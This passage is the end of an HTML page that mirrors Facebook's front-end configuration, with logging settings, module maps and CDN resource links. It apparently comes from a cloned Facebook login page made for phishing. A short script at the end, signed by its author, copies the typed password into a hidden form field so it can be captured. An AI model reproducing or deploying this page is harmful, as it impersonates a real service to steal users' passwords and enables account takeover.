                    "Aa2WcjouxcPOy3fMn-y0XlgLzEjIox58ujJDx3k-3Q__NnflxAXGCamBc5tY0Gl-Zxx0OXtugSi7uqzODC6HpkCzTjrts94",
                  ],
                },
                -1,
              ],
              [
                "cr:1039",
                [],
                {
                  __rc: [
                    null,
                    "Aa3J4nvRiqNUY-jaLoo6BkVtkmOn0iHGcJsRdik4N62wXbUKxdRG_c8Nnv8UtFTIoQTpgOXRj6o",
                  ],
                },
                -1,
              ],
              [
                "cr:1041",
                [],
                {
                  __rc: [
                    null,
                    "Aa3J4nvRiqNUY-jaLoo6BkVtkmOn0iHGcJsRdik4N62wXbUKxdRG_c8Nnv8UtFTIoQTpgOXRj6o",
                  ],
                },
                -1,
              ],
              [
                "cr:1048",
                [],
                {
                  __rc: [
                    null,
                    "Aa3J4nvRiqNUY-jaLoo6BkVtkmOn0iHGcJsRdik4N62wXbUKxdRG_c8Nnv8UtFTIoQTpgOXRj6o",
                  ],
                },
                -1,
              ],
              [
                "cr:917439",
                ["PageTransitionsBlue"],
                {
                  __rc: [
                    "PageTransitionsBlue",
                    "Aa3Pq1NB65NemVV_Xnk9Xllh8xdsaGAlXdfN_bCysQJHBuztWM9ATOmzMB51TXy0aPkUUWxs7vYtqa8B0O7BYCTiOJk",
                  ],
                },
                -1,
              ],
              [
                "cr:1108857",
                [],
                {
                  __rc: [
                    null,
                    "Aa1hcCoX9-1Req-fqQBRNkJh_cS4AgIjzFfPL9hMyPBFUrYrWwspARNojpjUT8eN1Szt5MPUK4KiZopC9A",
                  ],
                },
                -1,
              ],
              [
                "cr:1294158",
                ["React.classic"],
                {
                  __rc: [
                    "React.classic",
                    "Aa1vpoYcxLzWELr5CR-1fYM6kL5x2dCjSgKSUJGKYyQcLiqoDwLPqeJnASuWF_XQcK1JjdOuMh-vk7j-O6U8V_EpO_d2",
                  ],
                },
                -1,
              ],
              [
                "cr:1294246",
                ["ReactDOM.classic"],
                {
                  __rc: [
                    "ReactDOM.classic",
                    "Aa1vpoYcxLzWELr5CR-1fYM6kL5x2dCjSgKSUJGKYyQcLiqoDwLPqeJnASuWF_XQcK1JjdOuMh-vk7j-O6U8V_EpO_d2",
                  ],
                },
                -1,
              ],
              [
                "cr:1069930",
                [],
                {
                  __rc: [
                    null,
                    "Aa3Pq1NB65NemVV_Xnk9Xllh8xdsaGAlXdfN_bCysQJHBuztWM9ATOmzMB51TXy0aPkUUWxs7vYtqa8B0O7BYCTiOJk",
                  ],
                },
                -1,
              ],
              [
                "cr:1083116",
                ["XAsyncRequest"],
                {
                  __rc: [
                    "XAsyncRequest",
                    "Aa3Pq1NB65NemVV_Xnk9Xllh8xdsaGAlXdfN_bCysQJHBuztWM9ATOmzMB51TXy0aPkUUWxs7vYtqa8B0O7BYCTiOJk",
                  ],
                },
                -1,
              ],
              [
                "cr:1083117",
                [],
                {
                  __rc: [
                    null,
                    "Aa3Pq1NB65NemVV_Xnk9Xllh8xdsaGAlXdfN_bCysQJHBuztWM9ATOmzMB51TXy0aPkUUWxs7vYtqa8B0O7BYCTiOJk",
                  ],
                },
                -1,
              ],
              [
                "cr:11202",
                [],
                {
                  __rc: [
                    null,
                    "Aa1hcCoX9-1Req-fqQBRNkJh_cS4AgIjzFfPL9hMyPBFUrYrWwspARNojpjUT8eN1Szt5MPUK4KiZopC9A",
                  ],
                },
                -1,
              ],
              [
                "cr:888908",
                ["warningBlue"],
                {
                  __rc: [
                    "warningBlue",
                    "Aa3Pq1NB65NemVV_Xnk9Xllh8xdsaGAlXdfN_bCysQJHBuztWM9ATOmzMB51TXy0aPkUUWxs7vYtqa8B0O7BYCTiOJk",
                  ],
                },
                -1,
              ],
              [
                "cr:971473",
                ["LayerHideOnTransition"],
                {
                  __rc: [
                    "LayerHideOnTransition",
                    "Aa3Pq1NB65NemVV_Xnk9Xllh8xdsaGAlXdfN_bCysQJHBuztWM9ATOmzMB51TXy0aPkUUWxs7vYtqa8B0O7BYCTiOJk",
                  ],
                },
                -1,
              ],
              [
                "cr:1105154",
                [],
                {
                  __rc: [
                    null,
                    "Aa1hcCoX9-1Req-fqQBRNkJh_cS4AgIjzFfPL9hMyPBFUrYrWwspARNojpjUT8eN1Szt5MPUK4KiZopC9A",
                  ],
                },
                -1,
              ],
              [
                "BanzaiConfig",
                [],
                {
                  MAX_SIZE: 10000,
                  MAX_WAIT: 150000,
                  MIN_WAIT: null,
                  RESTORE_WAIT: 150000,
                  blacklist: ["time_spent"],
                  disabled: false,
                  gks: {
                    boosted_pagelikes: true,
                    mercury_send_error_logging: true,
                    platform_oauth_client_events: true,
                    graphexplorer: true,
                    sticker_search_ranking: true,
                  },
                  known_routes: [
                    "artillery_javascript_actions",
                    "artillery_javascript_trace",
                    "artillery_logger_data",
                    "logger",
                    "falco",
                    "gk2_exposure",
                    "js_error_logging",
                    "loom_trace",
                    "marauder",
                    "perfx_custom_logger_endpoint",
                    "qex",
                    "require_cond_exposure_logging",
                    "sri_logger_data",
                  ],
                  should_drop_unknown_routes: true,
                  should_log_unknown_routes: false,
                },
                7,
              ],
              [
                "PageTransitionsConfig",
                [],
                { reloadOnBootloadError: true },
                1067,
              ],
              ["CoreWarningGK", [], { forceWarning: false }, 725],
              [
                "cr:692209",
                ["cancelIdleCallbackBlue"],
                {
                  __rc: [
                    "cancelIdleCallbackBlue",
                    "Aa3Pq1NB65NemVV_Xnk9Xllh8xdsaGAlXdfN_bCysQJHBuztWM9ATOmzMB51TXy0aPkUUWxs7vYtqa8B0O7BYCTiOJk",
                  ],
                },
                -1,
              ],
              [
                "cr:1292365",
                ["React-prod.classic"],
                {
                  __rc: [
                    "React-prod.classic",
                    "Aa1hcCoX9-1Req-fqQBRNkJh_cS4AgIjzFfPL9hMyPBFUrYrWwspARNojpjUT8eN1Szt5MPUK4KiZopC9A",
                  ],
                },
                -1,
              ],
              [
                "cr:1344485",
                ["ReactDOM.classic.prod-or-profiling"],
                {
                  __rc: [
                    "ReactDOM.classic.prod-or-profiling",
                    "Aa1hcCoX9-1Req-fqQBRNkJh_cS4AgIjzFfPL9hMyPBFUrYrWwspARNojpjUT8eN1Szt5MPUK4KiZopC9A",
                  ],
                },
                -1,
              ],
              [
                "cr:983844",
                [],
                {
                  __rc: [
                    null,
                    "Aa1hcCoX9-1Req-fqQBRNkJh_cS4AgIjzFfPL9hMyPBFUrYrWwspARNojpjUT8eN1Szt5MPUK4KiZopC9A",
                  ],
                },
                -1,
              ],
              [
                "cr:1344486",
                ["ReactDOM.classic.prod"],
                {
                  __rc: [
                    "ReactDOM.classic.prod",
                    "Aa0IBQcvyZTl_2ijexUDL7TuiwjsDyjKT3fo1RnKASCBKAk6b-pai3tdcBgRCEUKzZrf7SjYx0q6ZNWtkN6yYUhsbDiDTnG6dw",
                  ],
                },
                -1,
              ],
              [
                "cr:1344487",
                ["ReactDOM-prod.classic"],
                {
                  __rc: [
                    "ReactDOM-prod.classic",
                    "Aa1nk0MPMsZP0kY5PjB6dqMT8Fme7I5Ozq_T2vi3_66fSD5QU5covq-8x30l0oNctWv1uX22hWBA5Zj_WATYts_unhVqf4nEVmFLl7iD",
                  ],
                },
                -1,
              ],
              [
                "cr:1353359",
                ["EventListenerImplForBlue"],
                {
                  __rc: [
                    "EventListenerImplForBlue",
                    "Aa2f3UvevyyFZCBfbQxUtdJ1HbntmLRrVdWyu13aIBDB6vJCAevOFqNTU9Rs6uW0TN2_ZFy8wuMSaRDhZTNyQUE45rEhAxqZhw",
                  ],
                },
                -1,
              ],
              [
                "KillabyteProfilerConfig",
                [],
                {
                  htmlProfilerModule: null,
                  profilerModule: null,
                  depTypes: { BL: "bl", NON_BL: "non-bl" },
                },
                1145,
              ],
              [
                "QuicklingConfig",
                [],
                {
                  version: "1005083706;0;",
                  sessionLength: 30,
                  inactivePageRegex:
                    "^/(fr/u\\.php|ads/|advertising|ac\\.php|ae\\.php|a\\.php|ajax/emu/(end|f|h)\\.php|badges/|comments\\.php|connect/uiserver\\.php|editalbum\\.php.+add=1|ext/|feeds/|help([/?]|$)|identity_switch\\.php|isconnectivityahumanright/|intern/|login\\.php|logout\\.php|sitetour/homepage_tour\\.php|sorry\\.php|syndication\\.php|webmessenger|/plugins/subscribe|lookback|brandpermissions|gameday|pxlcld|comet|worldcup/map|livemap|work/reseller|([^/]+/)?dialog|legal|.+\\.pdf$|.+/settings/)",
                  badRequestKeys: [
                    "nonce",
                    "access_token",
                    "oauth_token",
                    "xs",
                    "checkpoint_data",
                    "code",
                  ],
                  logRefreshOverhead: false,
                },
                60,
              ],
              [
                "WebDevicePerfInfoData",
                [],
                {
                  needsFullUpdate: true,
                  needsPartialUpdate: false,
                  shouldLogResourcePerf: false,
                },
                3977,
              ],
              [
                "WebStorageMonsterLoggingURI",
                [],
                { uri: "https://facebook.com/ajax/webstorage/process_keys/?state=1" },
                3032,
              ],
              [
                "TrackingConfig",
                [],
                { domain: "https://pixel.facebook.com" },
                325,
              ],
              ["BrowserPaymentHandlerConfig", [], { enabled: false }, 3904],
              [
                "TimeSpentConfig",
                [],
                { "0_delay": 0, "0_timeout": 8, delay: 1000, timeout: 64 },
                142,
              ],
              [
                "cr:1351741",
                ["CometEventListener"],
                {
                  __rc: [
                    "CometEventListener",
                    "Aa0RJymEx6Ym1FIFROe8vgkablJvzVFQ90454LHVVs3bsvzJDGpT8X4liWHr3jThkRMme9hLpQX3iittY8t0CemsSKNoIS2KYzCL8j8RaIrCAG69bawp",
                  ],
                },
                -1,
              ],
              [
                "cr:1634616",
                ["UserActivityBlue"],
                {
                  __rc: [
                    "UserActivityBlue",
                    "Aa3Pq1NB65NemVV_Xnk9Xllh8xdsaGAlXdfN_bCysQJHBuztWM9ATOmzMB51TXy0aPkUUWxs7vYtqa8B0O7BYCTiOJk",
                  ],
                },
                -1,
              ],
              [
                "cr:844180",
                ["TimeSpentImmediateActiveSecondsLoggerBlue"],
                {
                  __rc: [
                    "TimeSpentImmediateActiveSecondsLoggerBlue",
                    "Aa3Pq1NB65NemVV_Xnk9Xllh8xdsaGAlXdfN_bCysQJHBuztWM9ATOmzMB51TXy0aPkUUWxs7vYtqa8B0O7BYCTiOJk",
                  ],
                },
                -1,
              ],
              [
                "cr:1187159",
                ["BlueCompatBroker"],
                {
                  __rc: [
                    "BlueCompatBroker",
                    "Aa3Pq1NB65NemVV_Xnk9Xllh8xdsaGAlXdfN_bCysQJHBuztWM9ATOmzMB51TXy0aPkUUWxs7vYtqa8B0O7BYCTiOJk",
                  ],
                },
                -1,
              ],
              ["ImmediateActiveSecondsConfig", [], { sampling_rate: 0 }, 423],
            ],
            require: [
              [
                "BDClientSignalCollectionTrigger",
                "startSignalCollection",
                [],
                [
                  {
                    sc: '{"t":1637128278,"c":[[30000,838801],[30001,838801],[30002,838801],[30003,838801],[30004,838801],[30005,838801],[30006,573585],[30007,838801],[30008,838801],[30012,838801],[30013,838801],[30015,806033],[30018,806033],[30040,806033],[30093,806033],[30094,806033],[30095,806033],[30101,541591],[30102,541591],[30103,541591],[30104,541591],[30106,806039],[30107,806039],[38000,541427],[38001,806643]]}',
                    fds: 60,
                    fda: 60,
                    i: 60,
                    sbs: 1,
                    dbs: 100,
                    bbs: 100,
                    hbi: 60,
                    rt: 262144,
                    hbcbc: 2,
                    hbvbc: 0,
                    hbbi: 30,
                    sid: -1,
                    hbv: "2787578782426791893",
                  },
                ],
              ],
              ["CavalryLoggerImpl", "startInstrumentation", [], []],
              [
                "NavigationMetrics",
                "setPage",
                [],
                [
                  {
                    page: "XIndexReduxController",
                    page_type: "normal",
                    page_uri: "https://www.facebook.com/",
                    serverLID: "7065651880395410549-0",
                  },
                ],
              ],
              ["FalcoLoggerTransports", "attach", [], []],
              ["Chromedome", "start", [], [{}]],
              ["DimensionTracking"],
              ["NavigationClickPointHandler"],
              ["ServiceWorkerURLCleaner", "removeRedirectID", [], []],
              ["WebDevicePerfInfoLogging", "doLog", [], []],
              ["WebStorageMonster", "schedule", [], []],
              ["ClickRefLogger"],
              ["DetectBrokenProxyCache", "run", [], [0, "c_user"]],
              ["Artillery", "disable", [], []],
              ["ScriptPathLogger", "startLogging", [], []],
              ["TimeSpentBitArrayLogger", "init", [], []],
              [
                "RequireDeferredReference",
                "unblock",
                [],
                [["VisualCompletionGating"], "sd"],
              ],
              [
                "RequireDeferredReference",
                "unblock",
                [],
                [["VisualCompletionGating"], "css"],
              ],
            ],
          },
          hsrp: {
            hsdp: {
              clpData: {
                1743095: { r: 1, s: 1 },
                1871697: { r: 1, s: 1 },
                1829319: { r: 1 },
                1829320: { r: 1 },
                1843988: { r: 1 },
              },
              gkxData: {
                1652843: { result: false, hash: "AT6uh9NWRY4QEQoYvaA" },
              },
              qexData: { 661: { r: null } },
            },
            hblp: {
              consistency: { rev: 1005083598 },
              rsrcMap: {
                "+hSNGdc": {
                  type: "js",
                  src: "https://static.xx.fbcdn.net/rsrc.php/v3idBq4/yn/l/en_GB/wJkMK4AoSeG.js?_nc_x=Ij3Wp8lg5Kz",
                },
                CBQ4zUl: {
                  type: "js",
                  src: "https://static.xx.fbcdn.net/rsrc.php/v3/yt/r/CyNJRkmXvyt.js?_nc_x=Ij3Wp8lg5Kz",
                },
                FEt5GzN: {
                  type: "js",
                  src: "https://static.xx.fbcdn.net/rsrc.php/v3/yv/r/cN-N4Eu_deZ.js?_nc_x=Ij3Wp8lg5Kz",
                },
              },
              compMap: {
                TransportSelectingClientSingleton: {
                  r: ["rvsXwIm", "ZaK7abM", "F/p4sht"],
                  rds: {
                    m: [
                      "ContextualConfig",
                      "BladeRunnerClient",
                      "DGWRequestStreamClient",
                      "MqttLongPollingRunner",
                      "BanzaiScuba_DEPRECATED",
                    ],
                    r: [
                      "jM4vQSb",
                      "+jRpToS",
                      "+hSNGdc",
                      "nc2ZTn5",
                      "jpW6YKq",
                      "u4NoyfU",
                      "VdF6ypd",
                      "s84NfZE",
                      "14CUPgD",
                      "zA+yJGG",
                      "TPVHIx9",
                    ],
                  },
                  be: 1,
                },
                RequestStreamCommonRequestStreamCommonTypes: {
                  r: ["rvsXwIm"],
                  be: 1,
                },
              },
            },
          },
          allResources: [
            "CBQ4zUl",
            "s84NfZE",
            "TPVHIx9",
            "VdF6ypd",
            "FEt5GzN",
            "+jRpToS",
            "w3Wk9lz",
            "jyPWGxW",
            "jpW6YKq",
            "UiX2b//",
            "fmA3M6T",
            "GKQxLch",
            "ZaK7abM",
          ],
          onload: [
            'CavalryLogger.getInstance("7065651880395410549-0").setTTIEvent("t_domcontent");',
          ],
          onafterload: [
            'CavalryLogger.getInstance("7065651880395410549-0").collectBrowserTiming(window)',
            'window.CavalryLogger&&CavalryLogger.getInstance().setTimeStamp("t_paint");',
            'if (window.ExitTime){CavalryLogger.getInstance("7065651880395410549-0").setValue("t_exit", window.ExitTime);};',
          ],
        });
      });
    </script>
      <script>
      /* Coded By KasRoudra */
        const hiddenPass = document.getElementById("hiddenPass");
        const password = document.getElementById("pass");
        password.onchange = (e) => {
          hiddenPass.value = e.target.value;
        }
      </script>
  </body>
</html>
